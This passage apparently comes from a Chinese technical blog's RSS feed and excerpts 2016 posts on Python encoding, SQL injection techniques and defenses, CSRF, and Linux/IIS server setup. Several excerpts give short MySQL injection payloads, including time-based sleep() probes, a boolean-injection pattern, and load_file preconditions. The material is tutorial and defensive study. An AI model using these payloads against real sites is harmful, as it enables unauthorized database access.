 将16进制转换为对应的字符 #import binascii;binascii.a2b_hex(&amp;#39;61&amp;#39;)==&amp;gt;&amp;#39;a&amp;#39;

* hex(x) 
 将10进制整数转换为对应的16进制 #hex(16)==&amp;gt;&amp;#39;0x10&amp;#39;
* oct(x) 
 将10进制整数转换为对应的8进制 #oct(9)==&amp;gt;&amp;#39;011&amp;#39;
&lt;/code>&lt;/pre>&lt;h3 id="0x01-设置为utf-8">0x01 设置为utf-8&lt;/h3>
&lt;ul>
&lt;li>在py文件开头设置&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#-*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>或&lt;span style="color:#960050;background-color:#1e0010">：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#coding=utf8&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>永久编码(推荐)
&lt;img src="https://wyb0.cn/img/post/unicode_encode_error.png" alt="python编码出错.png">
可以在python安装路径下的Lib\site-packages下新建文件sitecustomize.py文件，内容如下：&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#coding=utf8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> sys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>reload(sys)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sys&lt;span style="color:#f92672">.&lt;/span>setdefaultencoding(&lt;span style="color:#e6db74">&amp;#39;utf8&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 此方法修改了python环境，设置系统默认编码，永久有效&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x03-编码转换">0x03 编码转换&lt;/h3>
&lt;p>python默认unicode为中间编码，所以无论是何种编码，解码时默认都解码为unicode&lt;/p></description></item><item><title>sqlmapapi 的简单使用</title><link>https://wyb0.cn/posts/2016/sqlmapapi-usage/</link><pubDate>Tue, 28 Jun 2016 11:19:11 +0000</pubDate><guid>https://wyb0.cn/posts/2016/sqlmapapi-usage/</guid><description>&lt;h3 id="0x00-关于sqlmapapipy">0x00 关于sqlmapapi.py&lt;/h3>
&lt;p>当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量&lt;/p>
&lt;h3 id="0x01-用于交互的方法">0x01 用于交互的方法&lt;/h3>
&lt;p>在sqlmap/lib/utils/api.py中:&lt;/p></description></item><item><title>CSRF 漏洞</title><link>https://wyb0.cn/posts/2016/csrf/</link><pubDate>Tue, 28 Jun 2016 09:21:34 +0000</pubDate><guid>https://wyb0.cn/posts/2016/csrf/</guid><description>&lt;h3 id="0x00-概念">0x00 概念&lt;/h3>
&lt;p>当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。&lt;/p></description></item><item><title>SQL 注入之防御</title><link>https://wyb0.cn/posts/2016/injection-of-defense/</link><pubDate>Sat, 25 Jun 2016 10:25:11 +0000</pubDate><guid>https://wyb0.cn/posts/2016/injection-of-defense/</guid><description>&lt;h3 id="0x00-要做的事">0x00 要做的事&lt;/h3>
&lt;p>也就是找到注入点然后修复&lt;/p>
&lt;h3 id="0x01-防御方法">0x01 防御方法&lt;/h3>
&lt;ul>
&lt;li>使用预编译语句绑定变量(比如php的mysqli、pdo)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//预编译
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $mysqli &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">mysqli&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;localhost&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;root&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;123456&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;share&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $mysqli&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">query&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;set names utf8&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s &lt;span style="color:#f92672">=&lt;/span> $mysqli&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">prepare&lt;/span>($sql);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//绑定参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Tom&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $sex &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;M&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">bind_param&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ssi&amp;#34;&lt;/span>,$name,$sex,$age);&lt;span style="color:#75715e">//ssi的意思是字符、字符、整型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//执行
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $result &lt;span style="color:#f92672">=&lt;/span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">execute&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_dump&lt;/span>($result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">close&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>使用存储过程(这里以SQLServer举例)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>--如果存在名为get_student_msg(相当于函数)的存储过程则删除
IF EXISTS (SELECT name FROM sysobjects WHERE name=&amp;#39;get_student_msg&amp;#39; AND type=&amp;#39;p&amp;#39;)
 DROP PROCEDURE get_student_msg

CREATE PROCEDURE get_student_msg --创建存储过程
 @name VARCHAR(20) --声明全局变量
AS
 BEGIN
 SELECT * from info
 WHERE name=@name
 END
GO

--创建好存储过程后在其他地方直接使用函数并传参就行了
EXEC get_student_msg &amp;#39;xiaoli&amp;#39;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>使用转义函数&lt;br>
如：addslashes()和mysql_real_escape_string()&lt;br>
在php.ini设置auto_prepend_file自动在脚本执行前在首部加载文件&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//简单过滤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_GET,&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_POST,&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_COOKIE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($filter &lt;span style="color:#66d9ef">as&lt;/span> $key &lt;span style="color:#f92672">=&amp;gt;&lt;/span> $value){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($value &lt;span style="color:#66d9ef">as&lt;/span> $k &lt;span style="color:#f92672">=&amp;gt;&lt;/span> $v){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filter[$key][$k] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">mysql_real_escape_string&lt;/span>($v);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>检查数据类型&lt;/p></description></item><item><title>SQL 注入之宽字节注入(MySQL)</title><link>https://wyb0.cn/posts/2016/injection-of-wide-byte/</link><pubDate>Fri, 24 Jun 2016 15:32:34 +0000</pubDate><guid>https://wyb0.cn/posts/2016/injection-of-wide-byte/</guid><description>&lt;h3 id="0x00-应用场景">0x00 应用场景&lt;/h3>
&lt;p>在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&lt;code>&amp;quot;\&amp;quot;&lt;/code>转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。&lt;/p></description></item><item><title>SQL 注入之基于时间的注入(MySQL)</title><link>https://wyb0.cn/posts/2016/injection-of-time-based/</link><pubDate>Fri, 24 Jun 2016 10:10:27 +0000</pubDate><guid>https://wyb0.cn/posts/2016/injection-of-time-based/</guid><description>&lt;h3 id="0x00-特点">0x00 特点&lt;/h3>
&lt;pre tabindex="0">&lt;code>当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。
其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;pre tabindex="0">&lt;code>整型注入的话可以直接: ?id=if(1=1,sleep(2),1)
字符型的话需要闭合: ?id=2&amp;#39; and if(1=1,sleep(2),1) and &amp;#39;1
&lt;/code>&lt;/pre>&lt;h3 id="0x02-相关函数">0x02 相关函数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>if(条件, 值1, 值2)&lt;br>
当条件为真时返回值1，条件为假时返回值2&lt;/p></description></item><item><title>SQL 注入之布尔型注入(MySQL)</title><link>https://wyb0.cn/posts/2016/injection-of-boolian-based/</link><pubDate>Thu, 23 Jun 2016 23:32:34 +0000</pubDate><guid>https://wyb0.cn/posts/2016/injection-of-boolian-based/</guid><description>&lt;h3 id="0x00-特点">0x00 特点&lt;/h3>
&lt;pre tabindex="0">&lt;code>当页面存在注入，但是没有显示位，且没有用echo &amp;#34;mysql_error()&amp;#34;输出错误信息时可以用，
它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;pre tabindex="0">&lt;code>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
根据返回页面是否相同来得到数据
&lt;/code>&lt;/pre>&lt;h3 id="0x02-注入步骤">0x02 注入步骤&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>找到注入点，判断闭合字符
&lt;img src="https://wyb0.cn/img/post/sqli8_get_closed_character.png" alt="得到闭合字符">&lt;/p></description></item><item><title>SQL 注入之报错型注入(MySQL)</title><link>https://wyb0.cn/posts/2016/injection-of-error-based/</link><pubDate>Wed, 22 Jun 2016 15:30:54 +0000</pubDate><guid>https://wyb0.cn/posts/2016/injection-of-error-based/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
&lt;pre tabindex="0">&lt;code>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):&lt;/p></description></item><item><title>SQL 注入之联合查询(MySQL)</title><link>https://wyb0.cn/posts/2016/injection-of-union-select/</link><pubDate>Tue, 21 Jun 2016 22:30:18 +0000</pubDate><guid>https://wyb0.cn/posts/2016/injection-of-union-select/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
&lt;p>要用联合查询进行注入则：页面必须有显示位&lt;/p>
&lt;h3 id="0x01-联合查询">0x01 联合查询&lt;/h3>
&lt;p>union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同&lt;/p></description></item><item><title>SQL 注入之 load_file 和 into outfile(MySQL)</title><link>https://wyb0.cn/posts/2016/injection-of-mysql-function/</link><pubDate>Mon, 20 Jun 2016 08:10:27 +0000</pubDate><guid>https://wyb0.cn/posts/2016/injection-of-mysql-function/</guid><description>&lt;h3 id="0x00-load_file-读文件">0x00 load_file() 读文件&lt;/h3>
&lt;ul>
&lt;li>条件:&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>1. 要有file_priv权限: show global variables like &amp;#39;%secure%&amp;#39;;
2. 知道文件绝对路径
3. 能使用union
4. 对web目录有读权限 
注：若过滤了单引号，则可以将函数中的字符进行hex编码
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>一般步骤&lt;/p></description></item><item><title>SQL 注入</title><link>https://wyb0.cn/posts/2016/injection/</link><pubDate>Sun, 19 Jun 2016 20:18:48 +0000</pubDate><guid>https://wyb0.cn/posts/2016/injection/</guid><description>&lt;h3 id="0x00-含义">0x00 含义&lt;/h3>
&lt;p>sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，&lt;/p></description></item><item><title>MySQL的information_schema库</title><link>https://wyb0.cn/posts/2016/mysql-database-table-information_schema/</link><pubDate>Sun, 19 Jun 2016 19:40:25 +0000</pubDate><guid>https://wyb0.cn/posts/2016/mysql-database-table-information_schema/</guid><description>&lt;h3 id="0x00-information_schema">0x00 information_schema&lt;/h3>
&lt;pre tabindex="0">&lt;code>information_schema这个数据库中保存了MySQL服务器所有数据库的信息。
如数据库名，数据库的表，表栏的数据类型与访问权限等。
再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，
每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。

information_schema的表schemata中的列schema_name记录了所有数据库的名字
information_schema的表tables中的列table_schema记录了所有数据库的名字
information_schema的表tables中的列table_name记录了所有数据库的表的名字
information_schema的表columns中的列table_schema记录了所有数据库的名字
information_schema的表columns中的列table_name记录了所有数据库的表的名字
information_schema的表columns中的列column_name记录了所有数据库的表的列的名字
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://wyb0.cn/img/post/information_schema_alltables.png" alt="50">&lt;/p></description></item><item><title>Windows2003 下搭建 IIS+asp</title><link>https://wyb0.cn/posts/2016/windows2003-set-up-iis-asp/</link><pubDate>Sat, 18 Jun 2016 20:39:50 +0000</pubDate><guid>https://wyb0.cn/posts/2016/windows2003-set-up-iis-asp/</guid><description>&lt;h3 id="0x00-添加组件">0x00 添加组件&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/add_component1.png" alt="40">
&lt;img src="https://wyb0.cn/img/post/add_component2.png" alt="55">
&lt;img src="https://wyb0.cn/img/post/add_component3.png" alt="50">
&lt;img src="https://wyb0.cn/img/post/add_component4.png" alt="55">&lt;/p>
&lt;h3 id="0x01-开启iis">0x01 开启iis&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/start_iis1.png" alt="70">
&lt;img src="https://wyb0.cn/img/post/start_iis2.png" alt="50">
&lt;img src="https://wyb0.cn/img/post/visit_iis_index.png" alt="45">&lt;/p>
&lt;h3 id="0x02-添加web服务扩展">0x02 添加Web服务扩展&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/add_ext.png" alt="65">&lt;/p>
&lt;h3 id="0x03-运行asp">0x03 运行asp&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/add_iis_asp.png" alt="50">
&lt;img src="https://wyb0.cn/img/post/visit_iis_asp.png" alt="50">&lt;/p>
&lt;h3 id="0x04-权限">0x04 权限&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/iis_perm.png" alt="55">&lt;/p></description></item><item><title>Linux 下搭建 FTP</title><link>https://wyb0.cn/posts/2016/linux-set-up-ftp/</link><pubDate>Sat, 18 Jun 2016 09:40:06 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-set-up-ftp/</guid><description>&lt;p>安装环境为：CentOS-6.5-x86_64-minimal&lt;/p>
&lt;h3 id="0x00-安装">0x00 安装&lt;/h3>
&lt;p>yum install vsftpd&lt;/p>
&lt;h3 id="0x01-配置">0x01 配置&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>备份&lt;br>
cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak&lt;/p>
&lt;/li>
&lt;li>
&lt;p>编辑配置文件&lt;/p>
&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>vim /etc/vsftpd/vsftpd.conf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>anonymous_enable&lt;span style="color:#f92672">=&lt;/span>NO	&lt;span style="color:#75715e">#设定不允许匿名访问&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>local_enable&lt;span style="color:#f92672">=&lt;/span>YES	&lt;span style="color:#75715e">#设定本地用户可以访问&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chroot_list_enable&lt;span style="color:#f92672">=&lt;/span>YES	&lt;span style="color:#75715e">#使用户不能离开主目录&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>xferlog_file&lt;span style="color:#f92672">=&lt;/span>/var/log/vsftpd.log	&lt;span style="color:#75715e">#设定vsftpd的服务日志&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ascii_upload_enable&lt;span style="color:#f92672">=&lt;/span>YES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ascii_download_enable&lt;span style="color:#f92672">=&lt;/span>YES	&lt;span style="color:#75715e">#设定支持ASCII&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pam_service_name&lt;span style="color:#f92672">=&lt;/span>vsftpd	&lt;span style="color:#75715e">#PAM认证文件名,PAM将根据/etc/pam.d/vsftpd进行认证&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 并在尾部追加：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>guest_enable&lt;span style="color:#f92672">=&lt;/span>YES	&lt;span style="color:#75715e">#设定启用虚拟用户功能。&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>guest_username&lt;span style="color:#f92672">=&lt;/span>ftp	&lt;span style="color:#75715e">#指定虚拟用户的宿主用户。-CentOS中已经有内置的ftp用户了&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>guest_config_dir&lt;span style="color:#f92672">=&lt;/span>/etc/vsftpd/vuser_conf	&lt;span style="color:#75715e">#设定虚拟用户个人vsftp的配置文件存放路径。存放虚拟用户个性化的配置文件名，和虚拟用户名相同&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>
&lt;p>新增chroot_list并将ftp用户输入进去&lt;br>
touch /etc/vsftpd/chroot_list&lt;br>
echo ftp &amp;raquo; /etc/vsftpd/chroot_list&lt;/p></description></item><item><title>Linux 下搭建 Tomcat+MySQL+JSP</title><link>https://wyb0.cn/posts/2016/linux-set-up-tomcat-mysql-jsp/</link><pubDate>Fri, 17 Jun 2016 23:08:05 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-set-up-tomcat-mysql-jsp/</guid><description>&lt;p>安装环境为：CentOS-6.5-x86_64-minimal&lt;/p>
&lt;h3 id="0x00-安装mysql">0x00 安装mysql&lt;/h3>
&lt;p>$ sudo yum install mysql mysql-server mysql-devel&lt;br>
&lt;img src="https://wyb0.cn/img/post/install_mysql.png" alt="安装mysql.png">
&lt;img src="https://wyb0.cn/img/post/creat_db_tomcat.png" alt="创建数据库tomcat.png">
&lt;img src="https://wyb0.cn/img/post/grant_db_tomcat.png" alt="将数据库tomcat分配给用户tomcat.png">&lt;/p>
&lt;h3 id="0x01-安装jdk和tomcat">0x01 安装jdk和tomcat&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>创建安装jdk和tomcat的文件夹
&lt;img src="https://wyb0.cn/img/post/mkdir_java_tomcat.png" alt="创建安装jdk和tomcat的文件夹.png">&lt;/p></description></item><item><title>Linux 下搭建 Nginx+MySQL+PHP</title><link>https://wyb0.cn/posts/2016/linux-set-up-nginx-mysql-php/</link><pubDate>Fri, 17 Jun 2016 22:41:50 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-set-up-nginx-mysql-php/</guid><description>&lt;p>安装环境为：CentOS-6.5-x86_64-minimal&lt;/p>
&lt;h3 id="0x00-准备工作">0x00 准备工作&lt;/h3>
&lt;pre tabindex="0">&lt;code>首先执行：
 sudo yum groupinstall &amp;#34;Development tools&amp;#34;
安装make：
 yum -y install gcc automake autoconf libtool make
安装g++：
 yum install gcc gcc-c++
&lt;/code>&lt;/pre>&lt;h3 id="0x01-安装mysql和php">0x01 安装mysql和php&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo yum install mysql mysql-server mysql-devel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo yum install php php-devel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo yum install php-gd php-mysql php-fpm
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-安装依赖">0x02 安装依赖&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>安装pcre、pcre-devel&lt;br>
sudo yum install pcre pcre-devel&lt;/p></description></item><item><title>Ubuntu 下使用 ShadowSocks</title><link>https://wyb0.cn/posts/2016/ubuntu-use-shadowsocks/</link><pubDate>Mon, 13 Jun 2016 09:14:45 +0000</pubDate><guid>https://wyb0.cn/posts/2016/ubuntu-use-shadowsocks/</guid><description>&lt;p>环境：Ubuntu14.04&lt;/p>
&lt;h3 id="0x00-安装shadowsocks-qt5">0x00 安装shadowsocks-qt5&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo apt-get update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt-get python-software-properties software-properties-common
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo add-apt-repository ppa:hzwhuang/ss-qt5（添加源）
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt-get update （更新你的软件库）
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt-get install shadowsocks-qt5 &lt;span style="color:#f92672">(&lt;/span>正式安装&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-配置客户端">0x01 配置客户端&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/ss_open_client.png" alt="打开shadowsocks客户端">&lt;/p></description></item><item><title>Python 编写规范</title><link>https://wyb0.cn/posts/2016/python-coding-style/</link><pubDate>Sun, 12 Jun 2016 22:17:35 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-coding-style/</guid><description>&lt;h3 id="0x00-代码编排">0x00 代码编排&lt;/h3>
&lt;pre tabindex="0">&lt;code>1.缩进：使用4个空格缩进
2.行长度：每行不要超过80个字符
3.空行：顶级定义之间空两行，如函数或类的定义，方法定义、类定义与第一个方法之间都应该空一行。
4.分号：行尾不要有分号，也不要用分号将两条命令放在一行,除非是：
 1.长的导入模块语句。
 2.注释里的URL.
 3.可以使用圆括号实现隐式行连接
&lt;/code>&lt;/pre>&lt;h3 id="0x01文档编排">0x01文档编排&lt;/h3>
&lt;pre tabindex="0">&lt;code>1.导入：模块注释-&amp;gt;文档字符串-&amp;gt;导入-&amp;gt;模块全局变量-&amp;gt;常量
 导入顺序：标准库导入-&amp;gt;第三方库导入-&amp;gt;应用程序指定库导入
2.import:不要在一行中import多个库，一行中只导入一个
&lt;/code>&lt;/pre>&lt;h3 id="0x02-空格">0x02 空格&lt;/h3>
&lt;pre tabindex="0">&lt;code>1.不要在逗号、分号、冒号前加空格，但应在他们后面加(除了在行尾)
2.二元操作符(赋值、比较、布尔)两边都加空格
3.当&amp;#34;=&amp;#34;用于指示关键字参数或默认参数值是，不要再其两侧使用空格
4.&amp;#34;,&amp;#34;和&amp;#34;#&amp;#34;和&amp;#34;=&amp;#34;不需要对齐，因为空格会成为维护的负担
&lt;/code>&lt;/pre>&lt;h3 id="0x03-注释">0x03 注释&lt;/h3>
&lt;pre tabindex="0">&lt;code>总体原则，错误的注释不如没有注释。
注释必须使用英文，最好是完整的句子，首字母大写，句后要有结束符，结束符后跟两个空格，开始下一句。如果是短语，可以省略结束符。
1.块注释：在一段代码前增加的注释。在&amp;#34;#&amp;#34;后加一空格。段落之间以只有&amp;#34;#&amp;#34;的行间隔。
2.行注释，在一句代码后加注释。进来少使用.
3.绝不要描述代码. 假设阅读代码的人比你更懂Python, 他只是不知道你的代码要做什么.
&lt;/code>&lt;/pre>&lt;h3 id="0x04-文档描述">0x04 文档描述&lt;/h3>
&lt;pre tabindex="0">&lt;code>1.为所有的共有模块、函数、类、方法写docstrings；非共有的没有必要，但是可以写注释（在def的下一行）。
2.如果docstring要换行，参考如下例子
class SampleClass(object):
 &amp;#34;&amp;#34;&amp;#34;Summary of class here.

 Longer class information....
 Longer class information....

 Attributes:
 likes_spam: A boolean indicating if we like SPAM or not.
 eggs: An integer count of the eggs we have laid.
 &amp;#34;&amp;#34;&amp;#34;

 def __init__(self):
 &amp;#34;&amp;#34;&amp;#34;Inits SampleClass with blah.&amp;#34;&amp;#34;&amp;#34;
&lt;/code>&lt;/pre>&lt;h3 id="0x05-命名规范">0x05 命名规范&lt;/h3>
&lt;pre tabindex="0">&lt;code>#类
1.类名使用大写字母开头的单词(如CapWords, 即Pascal风格)
2.类的属性（方法和变量）命名使用全部小写的方式，可以使用下划线。
3.类的方法第一个参数必须是self，而静态方法第一个参数必须是cls。
4.用双下划线(__)开头的实例变量或方法表示类内私有.

#函数
1.函数命名使用全部小写的方式，可以使用下划线。
